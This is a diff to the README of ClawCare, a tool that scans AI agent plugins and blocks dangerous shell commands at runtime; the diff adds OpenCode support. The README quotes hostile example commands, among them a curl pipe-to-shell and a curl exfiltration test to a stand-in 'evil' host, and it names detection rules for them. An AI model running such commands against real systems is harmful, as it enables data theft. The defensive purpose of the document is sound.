@@ -4,10 +4,11 @@
   <img src="https://github.com/AgentSafety/ClawCare/blob/main/clawcare.png?raw=true" alt="ClawCare" width="200" />
 </p>
 
-***Run AI agents with care - OpenClaw, Claude Code and more***
+***Run AI agents with care - OpenCode, OpenClaw, Claude Code and more***
 
 ClawCare is a multi-platform security tool to prevent AI agent skills, plugins and instructions from attacks. It scans and reports supply-chain threats like command injection, credential theft, data exfiltration, privilege escalation, and prompt injection. It also provides **runtime command interception** (ClawCare Guard) that blocks dangerous commands before they execute, and a **local HTML dashboard** for full visibility into scan results and guard audit trails. Use it as a CLI tool, integrate into CI/CD, or install as a hook/plugin for your agent platform.
 
+[![OpenCode](https://img.shields.io/badge/OpenCode-plugin-brightgreen?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PC9zdmc+)](https://opencode.ai/docs/plugins/)
 [![OpenClaw](https://img.shields.io/badge/OpenClaw-plugin-blue?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PC9zdmc+)](https://docs.openclaw.ai/tools/plugin)
 [![Claude Code](https://img.shields.io/badge/Claude_Code-hooks-blueviolet?logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
 [![Codex](https://img.shields.io/badge/Codex-supported-green?logo=openai&logoColor=white)](https://github.com/openai/codex)
@@ -17,7 +18,7 @@ ClawCare is a multi-platform security tool to prevent AI agent skills, plugins a
 
 ## Why
 
-AI coding agents (Claude Code, Cursor, Codex, OpenClaw) let you install third-party skills and plugins that can read your files, run commands, access secrets and extract sensitive data. A malicious skill can:
+AI coding agents (Claude Code, OpenCode, Cursor, Codex, OpenClaw) let you install third-party skills and plugins that can read your files, run commands, access secrets and extract sensitive data. A malicious skill can:
 
 - Pipe remote scripts into your shell (`curl ... | bash`)
 - Steal SSH keys and API tokens
@@ -51,7 +52,7 @@ clawcare scan <skill_directory>
 Guard mode:
 
 ```
-clawcare guard activate --platform {claude|openclaw}
+clawcare guard activate --platform {claude|openclaw|opencode}
 
 # Then ask your agent to run an attack command such as data exfiltration via curl:
 curl -d very-evil-site.com
@@ -68,7 +69,7 @@ clawcare dashboard
 
 ### ClawCare Scan
 
-Scan agent skills and plugins for vulnerabilities. Currently supports Claude Code, OpenClaw, Codex and Cursor Agent. Also works for generic SKILL.md.
+Scan agent skills and plugins for vulnerabilities. Currently supports Claude Code, OpenCode, OpenClaw, Codex and Cursor Agent. Also works for generic SKILL.md.
 
 ```bash
 # Scan a project — auto-detects the platform
@@ -107,7 +108,7 @@ Findings: 2 critical, 1 high, 0 medium, 0 low
 ============================================================
 ```
 
-### Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills
+### Platform Adapters for Claude Code, OpenCode, OpenClaw, Codex and Cursor Agent Skills
 
 Auto-detects the AI agent platform and scans the right files:
 
@@ -124,9 +125,9 @@ Only plugin and skill files are scanned — your application code, README, and C
 
 ## ClawCare Guard — Runtime Command Interception
 
-Intercept commands **at runtime** before the agent executes them and maintain an audit trail. 
+Intercept commands **at runtime** before the agent executes them and maintain an audit trail.
 
-Currently supports Claude Code and OpenClaw.
+Currently supports Claude Code, OpenCode, and OpenClaw.
 
 #### Quick Start
 
@@ -134,11 +135,18 @@ Currently supports Claude Code and OpenClaw.
 # Install hooks for Claude Code
 clawcare guard activate --platform claude
 
+# Install plugin for OpenCode (global)
+clawcare guard activate --platform opencode
+
+# Install plugin for OpenCode (project-level)
+clawcare guard activate --platform opencode --project
+
 # Install plugin for OpenClaw
 clawcare guard activate --platform openclaw
 
 # Check status
 clawcare guard status --platform claude
+clawcare guard status --platform opencode
 ```
 
 Once activated, every Bash/shell command the agent tries to run is scanned against ClawCare's rulesets. Dangerous commands are blocked; warnings are logged.
@@ -172,6 +180,7 @@ clawcare guard report --format json --since 7d
 | Platform | Mechanism | Hook Type |
 |----------|-----------|----------|
 | **Claude Code** | `PreToolUse` / `PostToolUse` hooks with matcher objects in `~/.claude/settings.json` | `{"type": "command", "command": "..."}` |
+| **OpenCode** | TypeScript plugin in `~/.config/opencode/plugins/` registered via `opencode.json` | `tool.execute.before` (throws to block) / `tool.execute.after` |
 | **OpenClaw** | TypeScript plugin installed to `~/.openclaw/extensions/` | `before_tool_call` / `after_tool_call` via plugin API |
 
 #### Platform-Specific Behavior
@@ -181,14 +190,17 @@ When a command triggers a finding **below** the `fail_on` severity (e.g. a mediu
 | Platform | Behavior | Why |
 |----------|----------|-----|
 | **Claude Code** | **Ask** — pauses and prompts the user to allow or deny the command, with the warning displayed | Claude Code's hook system supports a `permissionDecision: "ask"` response that hands control to the user |
+| **OpenCode** | **Allow with warning** — the command proceeds, but a warning message is printed for the agent to see | OpenCode's `tool.execute.before` hook only supports block (throw) or allow; there is no interactive prompt mechanism |
 | **OpenClaw** | **Allow with warning** — the command proceeds, but a warning message is printed for the agent to see | OpenClaw's `before_tool_call` hook only supports block or allow; there is no interactive prompt mechanism |
 
-Commands at or above `fail_on` severity are **blocked** on both platforms.
+Commands at or above `fail_on` severity are **blocked** on all platforms.
 
 #### Deactivate
 
 ```bash
 clawcare guard deactivate --platform claude
+clawcare guard deactivate --platform opencode
+clawcare guard deactivate --platform opencode --project   # project-level
 clawcare guard deactivate --platform openclaw
 ```
 
@@ -221,7 +233,11 @@ scan:
   fail_on: high              # minimum severity to block CI (critical | high | medium | low)
   block_local: false         # block locally too? (default: warn only)
   ignore_rules:
-    - MED_JS_EVAL            # suppress specific rules
+    - MED_JS_EVAL                      # suppress everywhere
+    - rule: CRIT_PIPE_TO_SHELL         # suppress in one file only
+      file: skills/legacy/setup.sh
+    - rule: HIGH_RAW_IP_OUTBOUND
+      file: "skills/network/**"        # glob patterns supported
   exclude:
     - "vendor/**"            # skip directories
   max_file_size_kb: 512      # skip large files
@@ -395,15 +411,17 @@ clawcare guard run -- <COMMAND>       Scan and execute a command (wrapper mode)
   --config PATH                       Path to guard config file
 
 clawcare guard activate               Install hooks/plugin for a platform
-  --platform claude|openclaw
+  --platform claude|openclaw|opencode
   --settings PATH                     Path to settings file (auto-detected if omitted)
-  --project                           Install at project level (Claude only)
+  --project                           Install at project level (Claude Code and OpenCode)
 
 clawcare guard deactivate             Remove hooks/plugin
-  --platform claude|openclaw
+  --platform claude|openclaw|opencode
+  --project                           Target project-level installation (OpenCode)
 
 clawcare guard status                 Check whether hooks are installed
-  --platform claude|openclaw
+  --platform claude|openclaw|opencode
+  --project                           Check project-level installation (OpenCode)
 
 clawcare guard report                 Query audit history
   --since DURATION                    Relative time (e.g. 24h, 30m, 7d) or ISO timestamp
@@ -413,7 +431,7 @@ clawcare guard report                 Query audit history
   --log-path PATH                     Override audit log path
 
 clawcare guard hook                   (internal) Handle a platform hook event
-  --platform claude|openclaw
+  --platform claude|openclaw|opencode
   --stage pre|post
 
 clawcare dashboard                    Generate HTML dashboard
